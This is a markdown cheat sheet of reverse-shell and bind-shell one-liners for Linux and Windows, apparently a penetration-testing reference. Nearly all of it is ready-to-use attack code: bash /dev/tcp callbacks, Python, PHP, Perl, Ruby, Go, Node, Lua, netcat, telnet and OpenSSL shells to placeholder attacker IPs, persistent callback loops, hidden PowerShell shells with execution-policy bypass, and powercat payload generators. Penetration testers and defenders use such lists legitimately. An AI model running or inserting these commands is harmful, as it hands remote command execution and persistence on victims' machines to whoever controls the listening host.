# OneLiners

## 01 - Linux

### 1.1 - Reverse Shells

#### 1.1.1 - Awk

##### 1.1.1.1 - TCP Method

`$ awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do { printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null`

#### 1.1.2 - Bash

##### 1.1.2.1 - TCP Method

- Target

`$ /bin/bash -i >& /dev/tcp/<IP>/<LPORT> 0>&1`

- Attacker

`user@pentestos:~$ nc -lnvp <LPORT>`

##### 1.1.2.2 - UDP Method

- Target

`$ /bin/bash -i >& /dev/udp/<IP>/<LPORT> 0>&1`

- Attacker

`user@pentestos:~$ nc -luvp <LPORT>`

##### 1.1.2.3 - Persistent Callback Shell

- In case you might lose the callback connection. It's better to make it persistent.

`$ while true; do /bin/bash -c /path/to/shell; sleep 10; done`

`$ while true; do /bin/bash -i >& /dev/<protocol>/<IP>/<LPORT> 0>&1; sleep 10; done`

#### 1.1.3 - Python

##### 1.1.3.1 - IPv4

- Method 1 with IPv4

`$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'`

- Method 2 with IPv4

`$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`

##### 1.1.3.1 - IPv6

`$ python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("<IPv6>",<PORT>,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'`

#### 1.1.4 - PHP

`$ php -r '$sock=fsockopen("<IP>", <PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'`

`$ php -r '$sock=fsockopen("<IP>", <PORT>);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'`

#### 1.1.5 - Perl

`$ perl -e 'use Socket;$i="<IP>";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'`

`$ perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"<IP>:<PORT>");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'`

#### 1.1.6 - OpenSSL

##### 1.1.6.1 - Generate a TLS certificate to encrypt the network traffic

- Listener

`user@pentestos:~$ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes`

`user@pentestos:~$ openssl s_server -quiet -key key.pem -cert cert.pem -port <PORT>`

`user@pentestos:~$ ncat --ssl -vv -l -p <PORT>`

- Target

`$ mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <IP>:<PORT> > /tmp/s; rm /tmp/s`

#### 1.1.7 - Ruby

`$ ruby -rsocket -e'f=TCPSocket.open("<IP>", <PORT>).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)'`

#### 1.1.8 - Go

`$ echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","<IP>:<PORT>");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go`

#### 1.1.9 - Java

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<IP>/<PORT>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

#### 1.1.10 - Lua

`$ lua -e "require('socket');require('os');t=socket.tcp();t:connect('<IP>','<PORT>');os.execute('/bin/sh -i <&3 >&3 2>&3');"`

`$ lua5.1 -e 'local host, port = "<IP>", <PORT> local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'`

#### 1.1.11 - NodeJS

##### 1.1.11.1 - Method 1

```javascript
(function() {
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(<PORT>, "<IP>", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
```

##### 1.1.11.2 - Method 2

```javascript
require('child_process').exec('nc -e /bin/sh <attacker_IP> <LPORT>')
```

##### 1.1.11.3 - Method 3

```javascript
var x = global.process.mainModule.require
x('child_process').exec('nc <attacker_IP> <LPORT> -e /bin/bash')
```

#### 1.1.12 - Netcat

##### 1.1.12.1 - GNU

`$ nc -e /bin/sh <IP> <PORT>`

`$ nc -e /bin/bash <IP> <PORT>`

##### 1.1.12.2 - OpenBSD

`$ rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <IP> <PORT> > /tmp/f`

`$ rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <IP> <PORT> > /tmp/f`

#### 1.1.13 - Telnet

`$ rm -f /tmp/p; mknod /tmp/p p && telnet <IP> <PORT> 0/tmp/p`

`$ telnet <target_IP> 1234 | /bin/bash | telnet <attacker_IP> 1235` 

`$ nc -lvnp 1235`

#### 1.1.14 - Tarball

```
$ echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/<IP>/<PORT> 0>&1' > a.sh
$ tar -cvf a.tar a.sh
$ sudo -u $USER tar -xvf a.tar --to-command /bin/bash
```

#### 1.1.15 - Xterm

- Reverse shell to run the target

`$ xterm -display 192.168.0.105:1`

- Modify the x11

`user@pentestos:~$ cat /etc/X11/Xwrapper.config`

---

```
allowed_users=anybody
```

`user@pentestos:~$ sudo systemctl restart display-manager`

- Starting a listener with a port 6001

`user@pentestos:~$ Xnest -ac :1`

- Authorize it then you'll receive the connection

`user@pentestos:~$ xhost +<target_IP>`

### 1.2 - Bind Shells

#### 1.2.1 - Python

```
$ export RHOST="<IP>";export RPORT=<PORT>;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("$RHOST"),int(os.getenv("$RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

## 02 - Windows

### 2.1 - Reverse Shells

#### 2.1.1 - Powershell

##### 2.1.1.1 - Regular

```powershell
PS C:\> $client = New-Object System.Net.Sockets.TCPClient("<IP>", <PORT>); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> "; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte, 0, $sendbyte.Length); $stream.Flush()}; $client.Close()

C:\> powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("<IP>", <PORT>);$stream = $client.GetStream(); [byte[]]$bytes = 0..65535 | % {0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String);$sendback2  = $sendback + "PS " + (pwd).Path + "> "; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte, 0, $sendbyte.Length); $stream.Flush()}; $client.Close()
```

##### 2.1.1.2 - Powercat

- **Generate reverse shell**

`PS C:\> powercat -c <IP> -p <PORT> -e cmd.exe -g`

- **Generate base64 encoded reverse shell**

`PS C:\> powercat -c <IP> -p <PORT> -e cmd.exe -ge`

- **Persist Callback Shell**

`PS C:\> powercat -c <IP> -p <PORT> -e cmd.exe -rep`

#### 2.1.2 - Python

```
C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('<IP>', <PORT>)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
```

#### 2.1.3 - Perl

`C:\> perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"<IP>:<PORT>");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'`

#### 2.1.4 - Ruby

`C:\> ruby -rsocket -e 'c=TCPSocket.new("<IP>","<PORT>");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`

#### 2.1.5 - Lua

```
C:\> lua5.1 -e 'local host, port = "<IP>", <PORT> local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```

### 2.2 - Bind Shells

#### 2.2.1 - Regular Shell

```powershell
C:\> powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',<PORT>);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
```

#### 2.2.2 - Generate via Powercat

- Generate bind shell

`PS C:\> powercat -l -p <PORT> -e cmd.exe -g`

- Generate encoded bind shell

`PS C:\> powercat -l -p <PORT> -e cmd.exe -ge`

## References

- [Shells Linux](https://book.hacktricks.xyz/shells/shells/linux)

- [Hacktricks Shell Windows](https://book.hacktricks.xyz/shells/shells/windows)

- [Powercat](https://github.com/besimorhino/powercat)

- [Commands in Windows to Get Shell](https://ironhackers.es/en/cheatsheet/comandos-en-windows-para-obtener-shell/)

- [Reverse Shell Cheatsheet](https://thedarksource.com/reverse-shell-cheat-sheet/)

- [Awesome Reverse Shell](https://github.com/MrPineMan/Awesome-Reverse-Shell)

- [Reverse Shell Cheatsheet Pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

- [Day 43 Reverse Shell with OpenSSL](https://int0x33.medium.com/day-43-reverse-shell-with-openssl-1ee2574aa998)

- [Detecting and Investigating OpenSSL Backdoors on Linux](https://www.sandflysecurity.com/blog/detecting-and-investigating-openssl-backdoors-on-linux/)

- [JSgen](https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py)